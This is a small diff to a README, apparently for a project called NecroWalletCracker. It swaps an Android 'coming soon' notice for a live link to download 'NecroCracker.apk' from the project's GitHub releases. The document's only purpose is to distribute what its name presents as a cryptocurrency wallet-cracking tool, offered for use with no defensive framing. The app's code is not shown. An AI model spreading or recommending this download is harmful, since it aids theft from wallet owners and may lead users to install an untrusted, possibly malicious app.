@@ -28,13 +28,11 @@ Download the latest Windows version here:
 
 ## 📱 Android
 
-The Android version is currently under development.
+Download the latest Android version here:
 
-> 🚧 Coming Soon
 
-<!--
-[⬇ Download for Android]()
--->
+[⬇ Download for Android](https://github.com/N3R088NCE/NecroWalletCracker/releases/download/NecroCracker/NecroCracker.apk)
+
 
 ---
 
